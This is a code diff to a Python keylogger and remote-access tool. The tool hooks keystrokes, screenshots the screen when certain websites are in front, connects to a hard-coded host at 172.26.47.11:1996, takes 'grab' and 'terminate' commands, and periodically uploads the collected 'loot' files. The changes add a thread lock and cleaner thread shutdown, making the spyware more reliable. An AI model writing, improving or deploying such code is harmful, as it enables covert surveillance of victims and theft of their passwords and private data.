@@ -1,6 +1,6 @@
 import socket
 import tempfile
-from threading import Timer, Thread
+from threading import Timer, Thread, Lock
 from PIL import ImageGrab
 import platform
 from getpass import getuser
@@ -28,11 +28,13 @@ obj = pyHook.HookManager()
 lastWindowText = ''
 windowText = ''
 tempdirpath = tempfile.mkdtemp()
+lock = Lock()
 
 
 def keypressed(event):
     global windowText
     global lastWindowText
+    global lock
     # Take a screenshot if any of the mentioned website is in the front screen
     w = win32gui
     windowText = w.GetWindowText(w.GetForegroundWindow())
@@ -52,9 +54,11 @@ def keypressed(event):
         keys = chr(event.Ascii)
 
     store += keys
+    lock.acquire()              # To avoid modification by emptyloot() thread
     fp = open('keylogs.txt', 'a+')
     fp.write(store)
     fp.close()
+    lock.release()
     lastWindowText = windowText
     return True
 
@@ -62,7 +66,7 @@ def keypressed(event):
 def keylogger():
     obj.KeyDown = keypressed
     obj.HookKeyboard()
-    pythoncom.PumpMessages()
+    pythoncom.PumpMessages()        # Not returning as keylogger thread needs to be running in the background
 
 
 def transfer(s, path):
@@ -219,6 +223,7 @@ def emptyLoot():
         count = len(files)  # To keep track whether all files have been transferred
         while count:
             for fileName in files:
+                lock.acquire()      # To avoid modification by keylogger thread
                 sendingFile = {'fileToUpload': open(fileName, 'rb')}
                 checksum = md5Hash(sendingFile['fileToUpload'])         # Send the md5sum hash to compare with
                 didItGetTransferred = sendFile(checksum, sendingFile)
@@ -228,15 +233,17 @@ def emptyLoot():
                         count -= 1
                     except:
                         pass
+                lock.release()
 
 
-def terminate(s):
+def terminate(s, keyloggerThread, lootThread):
     s.close()
-    keyloggerThread.exit()
+    keyloggerThread.join()
+    lootThread.join()
     emptyLoot()         # To transfer files
 
 
-def connect():
+def connect(keyloggerThread, lootThread):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect(('172.26.47.11', 1996))
     s.send(getuser())
@@ -244,7 +251,7 @@ def connect():
     while True:
         command = s.recv(1024)
         if 'terminate' in command:
-            terminate(s)
+            terminate(s, keyloggerThread, lootThread)
             break
 
         elif 'grab' in command:
@@ -290,7 +297,7 @@ def main():
     initialize()
     lootThread = Timer(30, emptyLoot())     # Timer thread to send loot after every 30 seconds
     lootThread.start()
-    connect()  # terminate() called when connection is closed
+    connect(keyloggerThread,lootThread)  # terminate() called when connection is closed
 
 
 main()
